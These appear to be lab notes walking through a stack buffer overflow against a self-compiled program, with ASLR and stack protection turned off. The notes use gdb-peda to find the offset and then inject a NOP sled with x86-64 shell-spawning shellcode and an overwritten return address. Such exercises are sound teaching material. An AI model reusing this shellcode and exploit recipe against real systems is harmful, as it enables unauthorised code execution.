Install gdb-peda:
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"

Check virtual address randomization and randomize it:
cat /proc/sys/kernel/randomize_va_space
sudo sysctl -w kernel.randomize_va_space=0

Compilation with disabled stack guard and stack shield
gcc -o stackOverflow stackOverflow.c -fno-stack-protector -z execstack 

open gdb
gdb stackOverflow

Check normal operation
run $(python2 -c 'print "a"*256')

Overflow
run $(python2 -c 'print "a"*600')

Find offset for overflowing the stack pointer:
pattern_create 600 pattern
run $(cat pattern)
pattern_search

Create appropiate input so that the SP is overwritten:
run $(python2 -c 'print "\x90"*450 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x41"*43 + "b"*6')

Examine memory:
x/200x

Find the address of one of the NOP codes:
Found address: 0x7fffffffe2f0
b = "\xf0\xe2\xff\xff\xff\x7f"
run $(python2 -c 'print "\x90"*450 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x41"*43 + "\xf0\xe2\xff\xff\xff\x7f"')